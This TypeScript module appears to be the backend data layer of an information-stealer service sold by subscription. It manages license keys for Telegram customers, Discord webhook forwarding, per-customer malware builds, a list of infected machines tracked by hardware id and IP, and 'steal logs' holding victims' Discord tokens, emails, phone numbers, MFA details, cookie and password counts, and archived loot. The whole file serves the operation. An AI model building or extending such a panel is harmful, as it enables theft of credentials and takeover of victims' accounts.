import { spawn, spawnSync } from "child_process";
import fs from "fs";
import path from "path";
import { dbPath } from "./config";

export type KeyRow = {
  key: string;
  note: string;
  days: number;
  created_at: number;
  expires_at: number;
  tg_id: number | null;
  revoked: number;
  username?: string | null;
};

export type UserRow = {
  tg_id: number;
  key: string | null;
  webhook: string | null;
  init_url: string | null;
  username: string | null;
  updated_at: number;
  hook_id: string | null;
  hook_secret: string | null;
};

export function botDir() {
  return path.dirname(dbPath());
}

function botRoot() {
  return path.resolve(process.cwd(), "..", "bot");
}

function cliPath() {
  return path.join(botRoot(), "db_cli.py");
}

function pythonBin() {
  const venv = path.join(botRoot(), ".venv", "Scripts", "python.exe");
  if (fs.existsSync(venv)) return venv;
  return "python";
}

function call<T>(cmd: string, args: Record<string, unknown> = {}): T {
  const py = pythonBin();
  const cli = cliPath();
  const r = spawnSync(py, [cli, cmd, JSON.stringify(args)], {
    encoding: "utf8",
    timeout: 20_000,
    env: {
      ...process.env,
      PYTHONIOENCODING: "utf-8",
      PYTHONUTF8: "1",
    },
  });
  if (r.error) throw r.error;
  if (r.status !== 0) {
    throw new Error((r.stderr || r.stdout || "db_cli fail").trim());
  }
  const text = (r.stdout || "").trim();
  return JSON.parse(text || "null") as T;
}

export function now() {
  return Math.floor(Date.now() / 1000);
}

export function ingestUrl(base: string, hookId: string, hookSecret: string) {
  return `${base.replace(/\/$/, "")}/api/webhooks/${hookId}/${hookSecret}`;
}

export function maskWebhook(url: string | null | undefined) {
  if (!url) return "-";
  if (url.length < 24) return "***";
  return `${url.slice(0, 28)}…${url.slice(-6)}`;
}

export function validDiscordWebhook(url: string) {
  let u: URL;
  try {
    u = new URL(url.trim());
  } catch {
    return false;
  }
  if (u.protocol !== "https:") return false;
  const host = u.hostname.toLowerCase();
  const allowed = new Set(["discord.com", "discordapp.com", "canary.discord.com", "ptb.discord.com"]);
  if (!allowed.has(host)) return false;
  const parts = u.pathname.split("/").filter(Boolean);
  return parts[0] === "api" && parts[1] === "webhooks" && parts.length >= 4 && /^\d+$/.test(parts[2]);
}

export async function getKey(key: string) {
  return call<KeyRow | null>("get_key", { key });
}

export async function listKeys(limit = 80) {
  return call<KeyRow[]>("list_keys", { limit });
}

export async function insertKey(key: string, days: number, note: string) {
  call("insert_key", { key, days, note });
}

export async function revokeKey(key: string) {
  const res = call<{ ok: boolean }>("revoke_key", { key });
  return Boolean(res?.ok);
}

export async function getUser(tgId: number) {
  return call<UserRow | null>("get_user", { tg_id: tgId });
}

export async function listUsers(limit = 80) {
  return call<UserRow[]>("list_users", { limit });
}

export async function makeKey() {
  return call<{ key: string }>("make_key").key;
}

export async function userActive(tgId: number): Promise<{ ok: boolean; why: string }> {
  const user = await getUser(tgId);
  if (!user?.key) return { ok: false, why: "activation required" };
  const row = await getKey(user.key);
  if (!row) return { ok: false, why: "key missing" };
  if (row.revoked) return { ok: false, why: "key revoked" };
  if (row.expires_at < now()) return { ok: false, why: "key expired" };
  if (row.tg_id != null && Number(row.tg_id) !== tgId) return { ok: false, why: "key bound to another account" };
  return { ok: true, why: "ok" };
}

export async function keyLoginOk(key: string) {
  const row = await getKey(key);
  if (!row) return { ok: false as const, why: "invalid", user: null };
  if (row.revoked) return { ok: false as const, why: "invalid", user: null };
  if (row.expires_at < now()) return { ok: false as const, why: "invalid", user: null };
  if (row.tg_id == null) return { ok: false as const, why: "invalid", user: null };
  const user = await getUser(Number(row.tg_id));
  if (!user || user.key !== key) return { ok: false as const, why: "invalid", user: null };
  return { ok: true as const, why: "ok", user };
}

export async function ensureHook(tgId: number, rotate = false) {
  return call<{ id: string; secret: string }>("ensure_hook", { tg_id: tgId, rotate });
}

export async function setWebhook(tgId: number, url: string) {
  return call<{ id: string; secret: string }>("set_webhook", { tg_id: tgId, url });
}

export async function userIngest(tgId: number, base: string) {
  if (!base) return null;
  const pair = await ensureHook(tgId, false);
  return ingestUrl(base, pair.id, pair.secret);
}

export async function hookForwardTarget(hookId: string, hookSecret: string) {
  const user = call<UserRow | null>("get_user_by_hook", {
    hook_id: hookId,
    hook_secret: hookSecret,
  });
  if (!user) return { user: null, why: "not_found" };
  if (!user.webhook) return { user: null, why: "no_webhook" };
  const active = await userActive(Number(user.tg_id));
  if (!active.ok) return { user: null, why: active.why };
  return { user, why: "ok" };
}

export async function putOtp(tgId: number, code: string, ttl = 180) {
  call("put_otp", { tg_id: tgId, code, ttl });
}

export async function takeOtp(tgId: number, code: string) {
  const res = call<{ ok: boolean }>("take_otp", { tg_id: tgId, code });
  return Boolean(res?.ok);
}

export type BuildRow = {
  id: number;
  tg_id: number;
  kind: string;
  status: string;
  detail: string | null;
  artifact: string | null;
  created_at: number;
  finished_at: number | null;
  label?: string | null;
  icon?: string | null;
  theme?: string | null;
  theme_w?: number | null;
  theme_h?: number | null;
};

export async function addBuild(
  tgId: number,
  kind: string,
  label?: string | null,
  icon?: string | null,
  theme?: string | null,
  themeW?: number | null,
  themeH?: number | null,
) {
  return call<{ id: number }>("add_build", {
    tg_id: tgId,
    kind,
    label: label || null,
    icon: icon || null,
    theme: theme || null,
    theme_w: themeW ?? null,
    theme_h: themeH ?? null,
  });
}

export async function getBuild(id: number) {
  return call<BuildRow | null>("get_build", { id });
}

export async function listBuilds(tgId: number, limit = 20) {
  return call<BuildRow[]>("list_builds", { tg_id: tgId, limit });
}

export type ThemeRow = {
  id: number;
  tg_id: number;
  label?: string | null;
  theme: string;
  created_at: number;
  username?: string | null;
};

export async function listThemes(limit = 200) {
  return call<ThemeRow[]>("list_themes", { limit });
}

export async function activeBuild(tgId: number) {
  return call<BuildRow | null>("active_build", { tg_id: tgId });
}

export async function lastBuildAt(tgId: number) {
  const res = call<{ created_at: number }>("last_build_at", { tg_id: tgId });
  return Number(res?.created_at || 0);
}

export function spawnBuildOne(buildId: number) {
  const py = pythonBin();
  const script = path.join(path.dirname(botDir()), "build_one.py");
  const root = path.dirname(path.dirname(botDir()));
  const outLog = path.join(botDir(), `build_${buildId}.log`);
  const pidFile = path.join(botDir(), `build_${buildId}.pid`);
  const out = fs.openSync(outLog, "a");
  const child = spawn(py, [script, "--id", String(buildId)], {
    cwd: root,
    detached: true,
    stdio: ["ignore", out, out],
    windowsHide: true,
  });
  if (child.pid) {
    try {
      fs.writeFileSync(pidFile, String(child.pid), "utf8");
    } catch {
      /* ignore */
    }
  }
  child.unref();
}

function killBuildPid(buildId: number) {
  const pidFile = path.join(botDir(), `build_${buildId}.pid`);
  let pid = 0;
  try {
    if (fs.existsSync(pidFile)) {
      pid = Number(fs.readFileSync(pidFile, "utf8").trim()) || 0;
    }
  } catch {
    pid = 0;
  }
  if (pid > 0) {
    try {
      if (process.platform === "win32") {
        spawn("taskkill", ["/PID", String(pid), "/T", "/F"], {
          stdio: "ignore",
          windowsHide: true,
          detached: true,
        }).unref();
      } else {
        try {
          process.kill(-pid, "SIGTERM");
        } catch {
          try {
            process.kill(pid, "SIGTERM");
          } catch {
            /* ignore */
          }
        }
      }
    } catch {
      /* ignore */
    }
  }
  try {
    if (fs.existsSync(pidFile)) fs.unlinkSync(pidFile);
  } catch {
    /* ignore */
  }
}

export async function cancelBuild(tgId: number, buildId: number) {
  const res = call<{ ok: boolean; error?: string; id?: number }>("cancel_build", {
    tg_id: tgId,
    id: buildId,
  });
  if (res?.ok) killBuildPid(buildId);
  return res;
}

export function projectRoot() {
  return path.dirname(path.dirname(botDir()));
}

export async function addAudit(tgId: number, level: string, msg: string, host: string) {
  return call<{ ok: boolean; id: number }>("add_audit", {
    tg_id: tgId,
    level,
    msg: String(msg).slice(0, 4000),
    host: String(host || "").slice(0, 200),
  });
}

export async function listAudit(opts: {
  tgId?: number;
  q?: string;
  limit?: number;
}) {
  return call<
    Array<{
      id: number;
      tg_id: number;
      level: string;
      msg: string;
      host: string;
      created_at: number;
    }>
  >("list_audit", {
    tg_id: opts.tgId ?? null,
    q: opts.q ?? "",
    limit: opts.limit ?? 200,
  });
}

export async function hookUser(hookId: string, hookSecret: string) {
  return call<UserRow | null>("get_user_by_hook", {
    hook_id: hookId,
    hook_secret: hookSecret,
  });
}

export type AgentRow = {
  hwid: string;
  tg_id: number;
  name: string | null;
  os: string | null;
  ip: string | null;
  last_seen: number;
  online: number;
  meta: string | null;
};

export async function upsertAgent(row: {
  hwid: string;
  tgId: number;
  name: string;
  os: string;
  ip: string;
  meta: string;
}) {
  return call<{ ok: boolean; hwid: string }>("upsert_agent", {
    hwid: row.hwid,
    tg_id: row.tgId,
    name: row.name,
    os: row.os,
    ip: row.ip,
    meta: row.meta,
  });
}

export async function setAgentOnline(hwid: string, online: boolean) {
  return call<{ ok: boolean }>("set_agent_online", { hwid, online });
}

export async function listAgents(tgId?: number, limit = 200) {
  return call<AgentRow[]>("list_agents", {
    tg_id: tgId ?? null,
    limit,
  });
}

export async function getAgent(hwid: string) {
  return call<AgentRow | null>("get_agent", { hwid });
}

export type StealLog = {
  id: number;
  tg_id: number;
  created_at: number;
  host: string | null;
  os: string | null;
  ip: string | null;
  username: string | null;
  discord_id: string | null;
  token: string | null;
  email: string | null;
  phone: string | null;
  mfa: string | null;
  badges: string | null;
  cookies: number;
  passwords: number;
  hq_friends: number;
  friends_json: string | null;
  zip_path: string | null;
  raw_kind: string | null;
  meta_json: string | null;
};

export async function addStealLog(row: {
  tgId: number;
  host?: string;
  os?: string;
  ip?: string;
  username?: string;
  discordId?: string;
  token?: string;
  email?: string;
  phone?: string;
  mfa?: string;
  badges?: string;
  cookies?: number;
  passwords?: number;
  hqFriends?: number;
  friendsJson?: string;
  zipPath?: string;
  rawKind?: string;
  metaJson?: string;
}) {
  return call<{ ok: boolean; id: number }>("add_steal_log", {
    tg_id: row.tgId,
    host: row.host ?? "",
    os: row.os ?? "",
    ip: row.ip ?? "",
    username: row.username ?? "",
    discord_id: row.discordId ?? "",
    token: row.token ?? "",
    email: row.email ?? "",
    phone: row.phone ?? "",
    mfa: row.mfa ?? "",
    badges: row.badges ?? "",
    cookies: row.cookies ?? 0,
    passwords: row.passwords ?? 0,
    hq_friends: row.hqFriends ?? 0,
    friends_json: row.friendsJson ?? "",
    zip_path: row.zipPath ?? "",
    raw_kind: row.rawKind ?? "",
    meta_json: row.metaJson ?? "{}",
  });
}

export async function updateStealLog(
  id: number,
  patch: Record<string, string | number | null | undefined>,
) {
  const args: Record<string, unknown> = { id };
  for (const [k, v] of Object.entries(patch)) {
    if (v !== undefined) args[k] = v;
  }
  return call<{ ok: boolean; id?: number; error?: string }>("update_steal_log", args);
}

export async function listStealLogs(opts: { tgId?: number; limit?: number }) {
  return call<StealLog[]>("list_steal_logs", {
    tg_id: opts.tgId ?? null,
    limit: opts.limit ?? 200,
  });
}

export async function getStealLog(id: number) {
  return call<StealLog | null>("get_steal_log", { id });
}

export async function latestStealLog(tgId: number, windowSec = 1800) {
  return call<StealLog | null>("latest_steal_log", {
    tg_id: tgId,
    window: windowSec,
  });
}

export function hitsDir() {
  return path.join(botDir(), "data", "hits");
}
